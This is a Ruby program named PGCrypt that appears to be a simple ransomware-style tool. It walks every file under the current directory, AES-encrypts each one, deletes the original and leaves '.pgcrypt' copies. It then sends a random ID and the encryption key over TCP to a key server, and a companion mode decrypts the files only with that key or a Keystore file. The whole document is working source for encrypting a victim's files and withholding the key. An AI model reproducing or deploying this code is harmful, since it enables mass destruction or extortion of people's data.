$VERBOSE=nil #Disable warning messages

require 'aes'
require "base64"
require 'socket'

def getFiles() 
	files = []

	Dir.glob("**/*") do |item| #Recursively get files + subdirs
		#checks if file is empty or too large to efficiently encrypt
		next if item == '.' or item == '..' or !item.include? "." or File.size(item) > 4000000000 or File.empty?(item)
		#puts item
		files.push(item)
	end

	#Remove needed files from array
	files.delete("Keystore")
	files.delete("Keystore.txt")
	files.delete("PGCrypt.rb")
	files.delete("PGCrypt.exe")
	files.delete("Server.exe")

	files = files.uniq #Remove any potential duplicates

	return files
end

def fileEncrypt(file, key)
	#read data into variable
	handler = File.open(file, 'rb')
	data = handler.read #read data in binary mode
	handler.close #close file
	File.delete(file) #delete the old file
	writefile = File.open(file + ".pgcrypt", "w") #create a new file with .pgcrypt attached
	encryptedContent = AES.encrypt(data, key) #encrypt the content...
	writefile.puts encryptedContent #and write it
	writefile.close #close the new file
end

def fileDecrypt(file, key)

	handler = File.open(file, 'rb') #open file to decrypt...

	data = handler.read #read all data in binary mode

	handler.close #close old file

	originalFileName = file.sub(".pgcrypt", '') #create filename with the .pgcrypt extension removed

	File.delete(file) #delete old file

	writefile = File.open(originalFileName, "wb") #recreate original file

	decryptedContent = AES.decrypt(data, key) #decrypt content

	writefile.puts decryptedContent #write to original file

	writefile.close #close new file
end

def encrypt() 
	files = getFiles() #get list of all files + subdirs

	length = files.length #get count of files
	iter = 0 

	key = AES.key #generate a completely random AES key
	puts "PGCrypt v1.2"
	print "Do you want to encrypt all files in this directory? Y/N: "
	choice = gets.chomp

	if(choice.downcase != "y") 
		puts "Goodbye!"
		puts "Press ENTER to continue..."
		gets
		exit
	end

	puts "Please wait..."
	puts "Do NOT close this program or shut down your PC or you will damage your files!"
	puts "Encryption in Progress..."

	if not defined?(Ocra) #will not execute if build is running
		files.each do |filename| 
			print "\r#{iter}/#{length}" #progress indicator, i.e 15/515
			iter = iter + 1 
			fileEncrypt(filename, key) #encrypt file
		end
		File.open(".ENCRYPTED", "w") do |file| #if encryption was done without ANY errors, create an empty file called .ENCRYPTED    
  			file.write("")   
		end
	end

	system("cls") or system("clear") #clear screen

	id = ('a'..'z').to_a.shuffle[0,32].join #generate a random 32 char id out of latin chars

	if not defined?(Ocra)
		begin
			s = TCPSocket.new 'localhost', 2000 #open TCP connection to server...
			s.print id + " : " + key #send the id and the AES key...
			s.close #and close the connection gracefully
			serverOffline = false
		rescue Errno::ECONNREFUSED
			serverOffline = true
		end
	end

	#display end menu
	puts "Successfully encrypted!"
	if serverOffline then puts "However, the Server wasn't reachable, so the key will be displayed." end
	puts ""
	puts "Your details:"
	puts "UID: #{id}"
	if serverOffline then puts "Key: #{key}" end
	puts "COPY THIS SOMEWHERE SAFE! IT'S NEEDED TO DECRYPT!"
	gets
end

def decrypt()
	files = getFiles() #get file list

	length = files.length #get count of files

	system 'cls' or system 'clear' #clear screen

	if not defined?(Ocra) #will not execute if building

		puts "PGWare Decryptor"

		puts "Select an Option: "
		puts "1) I need a decryption key"
		puts "2) I have a decryption key"

		mode = gets.chomp.to_i

		if(mode == 1) #display Help menu
			puts "Retrieve your key from the Server Keystore or ask an administrator!"
			puts "Press ENTER to continue..."
			gets
			exit
		else #enter decryption mode
			puts "Entering Decryption Mode."
			puts "Entering the wrong key or using a wrong Keystore will corrupt some data and you wont be able to recover it!"

			puts "Select an option: "
			puts "1) I have a decryption key"
			puts "2) I have a Keystore file"
			print "Enter a number: "

			mode = gets.chomp.to_i

			if(mode == 1) #raw AES key prompt
				puts "Decryption Key File Recovery"
				puts "Paste your key after this. Make sure to not include any other characters."
				print "Key: "
				key = gets.chomp #get key from user input
			else  #keystore key
				puts "Attempting Keystore File Recovery."
				puts "Make sure your Keystore file is placed in the directory this tool is in."
				puts "If you are ready, press ENTER."
				gets
				keystore = File.open("Keystore", "rb") #open file called 'Keystore'...
				key = keystore.read #read the raw key in it...
				keystore.close #and close it
				puts "Read #{key}"
			end

		iter = 0

		begin #begins cipher error trapping to alert if a wrong key is used
			files.each do |filename|				
				print "\r#{iter}/#{length}" #progress indicator, i.e 15/515
				iter = iter + 1 #add 1 to progress indicator
				fileDecrypt(filename, key) #decrypt file
			end

		rescue OpenSSL::Cipher::CipherError #error is raised if a wrong/invalid key was used
			puts "Bad encryption key! At least one file corrupted!"
			exit
		end

		File.delete(".ENCRYPTED") #remove .ENCRYPTED file if decryption was completed sucessfully without any errrors

		puts "All done!"

		puts "Press ENTER to continue..."

		gets
		end
	end
end

if File.exists?(".ENCRYPTED") #checks if successfull encryption has been done in the directory
	decrypt()
else
	encrypt()
end